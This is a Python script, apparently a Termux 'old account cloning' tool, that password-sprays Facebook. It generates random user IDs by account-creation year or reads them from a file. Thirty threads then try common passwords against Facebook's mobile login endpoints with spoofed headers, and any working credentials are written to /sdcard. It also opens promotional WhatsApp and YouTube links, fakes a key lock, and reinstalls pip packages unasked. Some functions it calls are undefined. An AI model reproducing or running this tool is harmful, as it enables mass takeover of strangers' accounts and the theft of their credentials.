import os
import shutil
import time
import datetime
import random
import uuid
import hashlib
import string
import requests
import sys
import json
import urllib
import subprocess
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
modules = ['requests', 'urllib3', 'mechanize', 'rich', 'bs4']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')
requests.urllib3.disable_warnings()
oks = []
cps = []
loop = 0
user = []
# Tumhara WhatsApp channel link
channel_link = "https://whatsapp.com/channel/0029VbEC2UpCMY0MGqKixB1S"

# Valid keys (channel par available hogi)
approved_keys = ["𝘇𝗶𝘆𝗮~𝗽𝗶𝗶𝗲~𝘁𝗲𝗿𝗶~𝗷𝗮𝗻𝗮𝗺"]

def first_step():
    os.system("clear")
    print("\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\033[1;32m        🔒 𝐙𝐈𝐘𝐀  𝐒𝐂𝐑𝐈𝐏𝐓 𝐋𝐎𝐂𝐊𝐄𝐃 🔒")
    print("\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    print("\033[1;32m 𝐉𝐎𝐈𝐍 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐈𝐍𝐀𝐋 𝐂𝐎𝐍𝐓𝐄𝐂𝐓++923013720615✅ \033[0m\n")
    print("\033[1;32m 𝐃𝐎𝐒𝐓𝐎 𝐊𝐄𝐘 𝐀𝐀𝐏𝐊𝐎 𝐂𝐇𝐀𝐈𝐍𝐀𝐋 𝐌𝐄 𝐌𝐈𝐋𝐄𝐆𝐀  ✅ \033[0m\n")
    print("\033[1;32m 𝐏𝐄𝐇𝐋𝐄 𝐉𝐎𝐈𝐍 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐈𝐍𝐀𝐋 𝐊𝐀𝐑𝐎.")
    os.system(f"xdg-open https://whatsapp.com/channel/0029VbE3DyO0rGiDtvR17l1k")
    input("\n[↩] 𝐉𝐀𝐁 𝐉𝐎𝐈𝐍 𝐊𝐀𝐑 𝐋𝐄𝐍𝐀 𝐓𝐀𝐁 𝐄𝐍𝐓𝐄𝐑 𝐃𝐀𝐁𝐀𝐎...")

def check_key():
    user_key = input("\n[?] Enter your key: ")
    if user_key in approved_keys:
        print("\n[✓] Key approved! Script is running...\n")
    else:
        print("\n[×] Invalid key! Dobara Channel par jao.")
        sys.exit()

first_step()
check_key()

# Ab yahan se aapka original function shuru hoga
def get_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 45
# Tool ka main code yahan likho
print(">>> Tool Successfully Unlocked <<<")
# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()


# Initial setup and promotion
os.system('clear')
print(' \x1b[38;5;46𝐦𝐙𝐈𝐘𝐀  𝐒𝐄𝐑𝐕𝐄𝐑 𝐋𝐎𝐀𝐃𝐈𝐍𝐆....')
os.system ('espeak -a 300 " WELLCOME TO ARMAN TOOL "')

os.system('pip uninstall -y requests chardet urllib3 idna certifi')
os.system('python -m pip install --upgrade chardet urllib3 idna certifi requests')
os.system('python -m pip install --upgrade httpx beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')



os.system('xdg-open https://youtube.com/@ziyatechnical111?si=r4IMNh9dMJqp8pMg')

os.system('xdg-open https://t.me/rbxrajachainal786')

os.system('xdg-open https://youtube.com/@ziyatechnical111?si=r4IMNh9dMJqp8pMg')

os.system('xdg-open https://whatsapp.com/channel/0029VbEC2UpCMY0MGqKixB1S')
def get_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 45
def open_url(url):
    try:
        import webbrowser
        if webbrowser.open(url):
            return True
    except:
        pass
    try:
        subprocess.run(["termux-open-url", url], check=True, timeout=5, capture_output=True)
        return True
    except:
        pass
    try:
        subprocess.run(["xdg-open", url], check=True, timeout=5, capture_output=True)
        return True
    except:
        pass
    return False
def futuristic_spinner(text="LOADING"):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    colors = ["\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 30) // 2)
    for _ in range(12):
        for c in chars:
            col = random.choice(colors)
            sys.stdout.write(f"\r{padding}{col}[{c}] {text} ...\033[0m")
            sys.stdout.flush()
            time.sleep(0.04)
    print("\r" + " " * 50 + "\r", end="")
def approval_system():
    open_url(YOUTUBE_LINK)
    unique_id = ''.join(random.choices('0123456789ABCDEF', k=6))
    user_key = f"RajaVauTeachWorld{unique_id}"
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 56) // 2)
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("\n")
        print(f"{padding}\033[1;96m    ██╗   ██╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗██████╗ \033[0m")
        print(f"{padding}\033[1;93m    ╚██╗ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;92m     ╚████╔╝ ██║   ██║██║   ██║   ██║   ██║   ██║██████╔╝\033[0m")
        print(f"{padding}\033[1;96m      ╚██╔╝  ██║   ██║██║   ██║   ██║   ██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;94m       ██║   ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝██████╔╝\033[0m")
        print(f"{padding}\033[1;95m       ╚═╝    ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m")
        print(f"{padding}\033[1;92m            ✦ WELCOME TO ZIYA PIIE TEACH WORLD ✦          \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m\n")
        print(f"{padding}\033[1;36m╔══════════════════════════════════════════════════════╗\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32mYour Key     : \033[1;33m{user_key}                        \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;37mSubscribe YouTube & Send key to WhatsApp for approval! \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;35mWhatsApp No  : +880 1345-294347                        \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m╚══════════════════════════════════════════════════════╝\033[0m")
        print(f"{padding}\033[1;32m [1] Join WhatsApp & Send Key to Admin\033[0m")
        print(f"{padding}\033[1;32m [2] Check Approval Status\033[0m")
        print(f"{padding}\033[1;31m [0] Exit\033[0m")
        print(f"{padding}\033[1;36m──────────────────────────────────────────────────────\033[0m")
        choice = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m")
        if choice == '1':
            open_url(WHATSAPP_GROUP)
            futuristic_spinner("OPENING WHATSAPP")
        elif choice == '2':
            futuristic_spinner("VERIFYING APPROVAL")
            print(f"\n{padding}\033[1;32m welcome to ZIYA PIIE Teach World\033[0m")
            print(f"{padding}\033[1;33m your Kes approved\033[0m")
            time.sleep(2.5)
            break
        elif choice == '0':
            exit("\033[1;32m━▷ Thanks for using ZIYA PIIE Tool ♥\033[0m")
        else:
            print(f"{padding}\033[1;31m [!] Invalid Choice!\033[0m")
            time.sleep(1)
# Set window title
sys.stdout.write('\x1b]2;𓆩【👑𝐀𝐑𝐌𝐀𝐍👑 】𓆪 \x07')

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""\033[1;32m
  
███████╗██╗██╗   ██╗ █████╗ 
╚══███╔╝██║╚██╗ ██╔╝██╔══██╗
  ███╔╝ ██║ ╚████╔╝ ███████║
 ███╔╝  ██║  ╚██╔╝  ██╔══██║
███████╗██║   ██║   ██║  ██║
╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝                                                     
\033[1;35m[+]𝐆𝐇𝐀𝐘𝐀𝐋 𝐓𝐎 𝐘𝐀𝐇𝐀 𝐇𝐀𝐑 𝐏𝐀𝐑𝐈𝐍𝐃𝐀 𝐇𝐀𝐈 𝐌𝐀𝐆𝐀𝐑")   
 \033[1;32m----------------------------------------------                           
 \033[1;32m[+] 𝐎𝐖𝐍𝐄𝐑  :       𝐙𝐈𝐘𝐀💞𝐏𝐈𝐈𝐄          💞🅛︎🅞︎ⓥⓔ💞
 \033[1;33m[+] 𝐁𝐄𝐒𝐓𝐈𝐄 :       𝐒𝐇𝐈𝐅𝐔💞 𝐏𝐈𝐈𝐄    ….. (¯`v´¯)♥
 \033[1;33m[+] 𝐁𝐄𝐒𝐓𝐔  :       𝐑𝐈𝐙𝐙𝐔💞𝐁𝐀𝐁𝐔    🫨…….•.¸.•´💞
 \033[1;33m[+] 𝐓𝐎𝐎𝐋𝐒  :       𝐅𝐁💞𝐎𝐋𝐃💋𝐂𝐋𝐎𝐍𝐈𝐂🫨….¸.•´💞
 \033[1;33m[+] 𝐒𝐓𝐀𝐓𝐔𝐒 :       𝐅𝐑𝐄𝐄👀𝐀𝐏𝐑𝐎𝐕𝐄𝐋🫨… (♡💞
  \033[1;32m----------------------------------------------
\033[1;35m[+]𝐉𝐎 𝐅𝐈𝐑  𝐒𝐄 𝐔𝐃 𝐒𝐀𝐊𝐄 𝐖𝐀𝐇𝐈 𝐙𝐈𝐍𝐃𝐀 𝐇𝐀𝐈 𝐙𝐀𝐍𝐀𝐁𝐁""")

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000') or uid.startswith('100000000') or uid.startswith('10000000') or uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith(('10007', '10008')):
            return '2022'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith('61'):  # 2024 ke liye 15 digit wali condition
            return '2024'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    else:
        return ''
def linex():
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 45) // 2)
    print(f"{padding}\033[1;95m───────────────────────────────────────────────\033[0m")
def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])
def success_box(uid, pw):
    width = max(get_width(), 40)
    box_padding = " " * max(0, (width - 60) // 2)
    acc_year = creationyear(uid)
    print(f"\n{box_padding}\033[1;92m╔══════════════════════════════════════════════════════╗")
    print(f"{box_padding}║ \033[1;91m [✓] SUCCESSFUL ACCOUNT FOUND ({acc_year})             \033[1;92m║")
    print(f"{box_padding}╠══════════════════════════════════════════════════════╣")
    print(f"{box_padding}║ \033[1;96m UID      : \033[1;93m{uid:<40} \033[1;92m║")
    print(f"{box_padding}║ \033[1;96m Password : \033[1;91m{pw:<40} \033[1;92m║")
    print(f"{box_padding}║ \033[1;96m Year     : \033[1;93m{acc_year:<40} \033[1;92m║")
    print(f"{box_padding}╚══════════════════════════════════════════════════════╝\033[0m")
    open('/sdcard/SHIFU-PIIE-OK.txt', 'a').write(f"UID: {uid} | Password: {pw} | Year: {acc_year}\n")
def BNG_71_():
    banner()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;96m╔════════════════════════════════════════════════╗\033[0m", flush=True)
    print(f"{p}\033[1;96m║ \033[1;92m[1] \033[1;95m✦ \033[1;97mOLD ACCOUNT CLONING TOOL                   \033[1;96m║\033[0m", flush=True)
    print(f"{p}\033[1;96m║ \033[1;91m[0] \033[1;95m✦ \033[1;97mEXIT PROGRAM                               \033[1;96m║\033[0m", flush=True)
    print(f"{p}\033[1;96m╚════════════════════════════════════════════════╝\033[0m", flush=True)
    linex()
    __Jihad__ = input(f"{p}\033[1;93m [-] SELECT OPTION ---> \033[0m")
    if __Jihad__ in ('1', '01', 'A', 'a'):
        futuristic_spinner("LOADING MAIN ENGINE")
        old_clone()
    elif __Jihad__ in ('0', '00'):
        exit("\033[1;32m━▷ THANKS FOR USING ZIYA PIIE TOOL ♥\033[0m")
    else:
        print(f"{p}\033[1;91m [!] INVALID OPTION SELECTED...\033[0m", flush=True)
        time.sleep(1)
        BNG_71_()
def old_clone():
    banner()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;95m╔════════════════════════════════════════════════╗\033[0m")
    print(f"{p}\033[1;95m║ \033[1;92m[1] \033[1;96m✦ \033[1;97mOLD SERIES CLONING (2010-2014)           \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m║ \033[1;92m[2] \033[1;96m✦ \033[1;97m100003/4 SERIES CLONING                  \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m║ \033[1;92m[3] \033[1;96m✦ \033[1;97m2009 SERIES CLONING                      \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m║ \033[1;92m[4] \033[1;96m✦ \033[1;97m2023 SERIES CLONING (10009...)           \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m║ \033[1;92m[5] \033[1;96m✦ \033[1;97m2024 SERIES CLONING (61...)              \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m║ \033[1;92m[6] \033[1;96m✦ \033[1;97mFILE CLONING (ids.txt se UIDs lein)      \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m║ \033[1;91m[0] \033[1;96m✦ \033[1;97mBACK TO MAIN MENU                        \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m╚════════════════════════════════════════════════╝\033[0m")
    linex()
    _input = input(f"{p}\033[1;93m [-] SELECT SERIES ---> \033[0m")
    if _input in ('1', '01'):
        futuristic_spinner("INITIALIZING SERIES")
        old_One()
    elif _input in ('2', '02'):
        futuristic_spinner("INITIALIZING SERIES")
        old_Tow()
    elif _input in ('3', '03'):
        futuristic_spinner("INITIALIZING SERIES")
        old_Tree()
    elif _input in ('4', '04'):
        futuristic_spinner("INITIALIZING SERIES")
        series_2023()
    elif _input in ('5', '05'):
        futuristic_spinner("INITIALIZING SERIES")
        series_2024()
    elif _input in ('6', '06'):
        futuristic_spinner("LOADING FILE")
        file_clone()
    elif _input in ('0', '00'):
        BNG_71_()
    else:
        print(f"{p}\033[1;91m [!] INVALID OPTION SELECTED...\033[0m")
        time.sleep(1)
        old_clone()
    user = []
    banner()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;93m [•] OLD CODE RANGE : 2010-2014\033[0m")
    linex()
    ask = input(f"{p}\033[1;92m [-] SELECT (1 or 2) ---> \033[0m")
    linex()
    banner()
    limit = input(f"{p}\033[1;92m [-] ENTER ID LIMIT (e.g. 20000) ---> \033[0m")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print(f"{p}\033[1;96m [1] METHOD 1 (High Speed)\033[0m")
    print(f"{p}\033[1;96m [2] METHOD 2 (Stable)\033[0m")
    linex()
    meth = input(f"{p}\033[1;93m [-] CHOOSE METHOD ---> \033[0m").strip()
    futuristic_spinner("STARTING THREAD POOL")
    with tred(max_workers=30) as pool:
        banner()
        print(f"{p}\033[1;92m [•] TOTAL TARGET IDS : {limit}\033[0m")
        print(f"{p}\033[1;93m 🇧🇩 For good results🇧🇩\033[0m")
        print(f"{p}\033[1;93m ✅Use Flight mode OFF/ON✅\033[0m")
        print(f"{p}\033[1;93m      ♥️Every 5 Minute  Later♥️\033[0m")
        linex()
        for mal in user:
            uid = star + mal
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            else:
                break
def old_Tow():
    user = []
    banner()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;93m [•] OLD CODE SERIES : 100003/4\033[0m")
    linex()
    limit = input(f"{p}\033[1;92m [-] ENTER ID LIMIT ---> \033[0m")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print(f"{p}\033[1;96m [1] METHOD A\033[0m")
    print(f"{p}\033[1;96m [2] METHOD B\033[0m")
    linex()
    meth = input(f"{p}\033[1;93m [-] CHOOSE METHOD ---> \033[0m").strip()
    futuristic_spinner("STARTING THREAD POOL")
    with tred(max_workers=30) as pool:
        banner()
        print(f"{p}\033[1;92m [•] TOTAL TARGET IDS : {limit}\033[0m")
        print(f"{p}\033[1;93m 🇧🇩 For good results🇧🇩\033[0m")
        print(f"{p}\033[1;93m ✅Use Flight mode OFF/ON✅\033[0m")
        print(f"{p}\033[1;93m      ♥️Every 5 Minute  Later♥️\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            else:
                break
def series_2023():
    user = []
    banner()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;93m [•] NEW CODE SERIES : 2023 (10009...) \033[0m")
    linex()
    limit = input(f"{p}\033[1;92m [-] ENTER ID LIMIT ---> \033[0m")
    linex()
    prefix = '10009'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=10)) # 2023 standard length UID pattern
        uid = prefix + suffix
        user.append(uid)
    print(f"{p}\033[1;96m [1] METHOD A\033[0m")
    print(f"{p}\033[1;96m [2] METHOD B\033[0m")
    linex()
    meth = input(f"{p}\033[1;93m [-] CHOOSE METHOD ---> \033[0m").strip()
    futuristic_spinner("STARTING THREAD POOL")
    with tred(max_workers=30) as pool:
        banner()
        print(f"{p}\033[1;92m [•] TOTAL TARGET IDS : {limit}\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            else:
                break

def series_2024():
    user = []
    banner()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;93m [•] NEW CODE SERIES : 2024 (61...) \033[0m")
    linex()
    limit = input(f"{p}\033[1;92m [-] ENTER ID LIMIT ---> \033[0m")
    linex()
    prefix = '615' # 2024 Graph API format usually starts with 61...
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=12))
        uid = prefix + suffix
        user.append(uid)
    print(f"{p}\033[1;96m [1] METHOD A\033[0m")
    print(f"{p}\033[1;96m [2] METHOD B\033[0m")
    linex()
    meth = input(f"{p}\033[1;93m [-] CHOOSE METHOD ---> \033[0m").strip()
    futuristic_spinner("STARTING THREAD POOL")
    with tred(max_workers=30) as pool:
        banner()
        print(f"{p}\033[1;92m [•] TOTAL TARGET IDS : {limit}\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            else:
                break
def file_clone():
    user = []
    banner()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;93m [•] FILE CLONING (READING ids.txt)\033[0m")
    linex()
    
    file_path = input(f"{p}\033[1;92m [-] ENTER FILE PATH (e.g. /sdcard/ids.txt) ---> \033[0m")
    if file_path == "":
        file_path = "ids.txt"
    
    try:
        with open(file_path, 'r') as f:
            for line in f:
                uid = line.strip()
                if uid:
                    user.append(uid)
    except FileNotFoundError:
        print(f"{p}\033[1;91m [!] File nahi mili! Dobara check karein.\033[0m")
        time.sleep(2)
        old_clone()
        return

    print(f"{p}\033[1;92m [•] TOTAL LOADED IDS : {len(user)}\033[0m")
    linex()
    print(f"{p}\033[1;96m [1] METHOD 1 (High Speed)\033[0m")
    print(f"{p}\033[1;96m [2] METHOD 2 (Stable)\033[0m")
    linex()
    meth = input(f"{p}\033[1;93m [-] CHOOSE METHOD ---> \033[0m").strip()
    futuristic_spinner("STARTING THREAD POOL")
    
    with tred(max_workers=30) as pool:
        banner()
        print(f"{p}\033[1;92m [•] PROCESSING FILE IDS...\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            else:
                break
def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mZIYA PIIE OK ID-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
       
        for pw in ('123456', '1234567', '12345678', '123456789', 'pakistan', 'khan123', 'iloveyou', '786786'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                success_box(uid, pw)
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)
def login_2(uid):
    global loop
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mZIYA PIIE -M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po) or 'session_key' in po:
                    success_box(uid, pw)
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1
if __name__ == '__main__':
    banner()
    print("[+] Banner loaded successfully")
    try:
        BNG_71_()
        print("[+] BNG_71 finished execution")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    input("\nPress Enter to exit...")